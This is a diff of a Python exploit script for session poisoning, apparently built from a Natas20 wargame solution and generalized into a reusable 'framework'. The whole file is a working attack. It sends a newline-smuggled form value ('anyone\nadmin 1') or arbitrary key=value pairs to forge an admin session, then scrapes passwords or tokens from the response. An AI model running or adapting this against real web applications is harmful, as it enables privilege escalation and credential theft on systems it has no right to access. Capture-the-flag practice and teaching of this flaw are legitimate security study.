@@ -1,121 +1,116 @@
 #!/usr/bin/env python3
 import argparse
+import requests
 import re
 import sys
-import requests
 
 
-DEFAULT_MATCH = "You are an admin"
-DEFAULT_COOKIE = "PHPSESSID"
-
-# Natas20-style session poisoning payload:
-# The server writes:  name <value>\n
-# If <value> contains a newline, we can inject a second line: admin 1
-DEFAULT_NAME_PAYLOAD = "anyone\nadmin 1"
-
-
-def parse_args():
-    p = argparse.ArgumentParser(
-        description="Exploit session-file injection via newline poisoning (Natas20-style)."
-    )
-    p.add_argument("--url", required=True, help="Target URL (e.g. http://host/index.php)")
-    p.add_argument("--user", required=True, help="HTTP Basic Auth username")
-    p.add_argument("--password", required=True, help="HTTP Basic Auth password")
-
-    p.add_argument("--cookie-name", default=DEFAULT_COOKIE, help=f"Session cookie name (default: {DEFAULT_COOKIE})")
-    p.add_argument("--match", default=DEFAULT_MATCH, help=f"Admin success string (default: {DEFAULT_MATCH})")
-    p.add_argument(
-        "--name-payload",
-        default=DEFAULT_NAME_PAYLOAD,
-        help=r"Value to send as 'name' (default: 'anyone\nadmin 1')"
-    )
-
-    p.add_argument("--timeout", type=float, default=8.0, help="Request timeout seconds (default: 8)")
-    p.add_argument("--verbose", action="store_true", help="Print extra debug info")
-    return p.parse_args()
-
-
-def extract_next_password(html: str) -> str | None:
-    # Generic enough for Natas pages:
-    m = re.search(r"Password:\s*([A-Za-z0-9]+)\s*</pre>", html)
+def extract_password(html: str):
+    m = re.search(r"Password:\s*([A-Za-z0-9]+)", html)
     if m:
         return m.group(1)
 
-    # Fallback pattern like earlier levels:
-    m = re.search(r"password for natas\d+\s*is\s*<b>([^<]+)</b>", html, re.IGNORECASE)
+    m = re.search(r"password.*?<b>([^<]+)</b>", html, re.IGNORECASE)
     if m:
         return m.group(1)
 
     return None
 
 
-def main():
-    args = parse_args()
+def solve_single_host(session, args):
+    session.get(args.inject_url, timeout=args.timeout)
+    payload = {args.param: args.payload}
+    session.post(args.inject_url, data=payload, timeout=args.timeout)
+    r = session.get(args.read_url, timeout=args.timeout)
+    return r.text
 
-    s = requests.Session()
-    s.auth = (args.user, args.password)
 
-    # 1) Establish a fresh session (get PHPSESSID set by server)
-    try:
-        r0 = s.get(args.url, timeout=args.timeout)
-    except requests.RequestException as e:
-        print(f"[-] Initial GET failed: {e}")
-        sys.exit(1)
+def solve_cross_host(session, args):
+    session.get(args.inject_url, timeout=args.timeout)
 
-    sid = s.cookies.get(args.cookie_name)
-    if args.verbose:
-        print(f"[*] Initial status: {r0.status_code}")
-        print(f"[*] {args.cookie_name} from server: {sid}")
-
+    sid = session.cookies.get(args.cookie_name)
     if not sid:
-        print(f"[-] No {args.cookie_name} cookie received. Check URL/cookie name.")
+        print(f"[-] No {args.cookie_name} cookie received from inject URL")
         sys.exit(1)
 
-    # 2) Poison session by sending newline injection in "name"
-    # NOTE: requests will send the newline as part of the form value.
-    try:
-        r1 = s.post(
-            args.url,
-            data={"name": args.name_payload},
-            timeout=args.timeout
-        )
-    except requests.RequestException as e:
-        print(f"[-] POST failed: {e}")
+    payload = {}
+    if args.require_submit:
+        payload[args.submit_key] = args.submit_value
+
+    for kv in args.kv:
+        k, v = kv.split("=", 1)
+        payload[k] = v
+
+    session.post(args.inject_url, data=payload, timeout=args.timeout)
+
+    r = session.get(
+        args.read_url,
+        cookies={args.cookie_name: sid},
+        timeout=args.timeout
+    )
+
+    return r.text
+
+
+def main():
+    p = argparse.ArgumentParser(description="Generic session poisoning framework")
+
+    p.add_argument("--mode", choices=["single-host", "cross-host"], required=True)
+
+    p.add_argument("--inject-url", required=True, help="URL where the session is created and poisoned")
+    p.add_argument("--read-url", required=True, help="URL where poisoned session is evaluated")
+
+    p.add_argument("--user", required=True, help="HTTP Basic Auth username")
+    p.add_argument("--password", required=True, help="HTTP Basic Auth password")
+
+    p.add_argument("--cookie-name", default="PHPSESSID", help="Session cookie name (default: PHPSESSID)")
+
+    p.add_argument("--param", default="name", help="Parameter name to poison (single-host mode)")
+    p.add_argument("--payload", default="anyone\nadmin 1",
+                   help="Payload value for the parameter (single-host mode)")
+
+    p.add_argument("--kv", action="append",
+                   help="Key=value pair to inject into the session (cross-host mode)")
+    p.add_argument("--require-submit", action="store_true",
+                   help="Include a submit-style trigger parameter")
+    p.add_argument("--submit-key", default="submit", help="Key name for submit parameter")
+    p.add_argument("--submit-value", default="1", help="Value for submit parameter")
+
+    p.add_argument("--timeout", type=float, default=8.0)
+    p.add_argument("--verbose", action="store_true")
+
+    args = p.parse_args()
+
+    session = requests.Session()
+    session.auth = (args.user, args.password)
+
+    if args.mode == "single-host":
+        html = solve_single_host(session, args)
+
+    elif args.mode == "cross-host":
+        if not args.kv:
+            print("[-] cross-host mode requires at least one --kv argument (e.g. --kv admin=1)")
+            sys.exit(1)
+        html = solve_cross_host(session, args)
+
+    else:
+        print("[-] Invalid mode")
         sys.exit(1)
 
     if args.verbose:
-        print(f"[*] POST status: {r1.status_code}")
+        print("\n--- FULL RESPONSE ---\n")
+        print(html)
 
-    # 3) Refresh (server reads session file -> should now include admin=1)
-    try:
-        r2 = s.get(args.url, timeout=args.timeout)
-    except requests.RequestException as e:
-        print(f"[-] Verification GET failed: {e}")
-        sys.exit(1)
+    if "You are an admin" in html or "admin" in html.lower():
+        print("[+] Privileged session detected")
 
-    if args.match in r2.text:
-        print("[+] Admin session achieved via session injection.")
-        print(f"    {args.cookie_name} : {sid}")
-
-        pw = extract_next_password(r2.text)
+        pw = extract_password(html)
         if pw:
-            print(f"    Next password: {pw}")
+            print(f"[+] Extracted password/token: {pw}")
         else:
-            print("[!] Admin detected, but could not extract the next password automatically.")
-            if args.verbose:
-                print("\n--- RAW RESPONSE ---\n")
-                print(r2.text)
-
-        sys.exit(0)
-
-    print("[-] Admin not achieved. Things to check:")
-    print("    - Ensure the target uses Natas20-style custom session storage (line-based key/value).")
-    print("    - Ensure the injection payload contains a literal newline: --name-payload $'x\\nadmin 1'")
-    print("    - Try a different payload prefix (e.g. 'test\\nadmin 1').")
-    if args.verbose:
-        print("\n--- RESPONSE SNIPPET ---")
-        print(r2.text[:500])
-    sys.exit(2)
+            print("[!] Could not automatically extract password/token")
+    else:
+        print("[-] Privileged session not detected")
 
 
 if __name__ == "__main__":
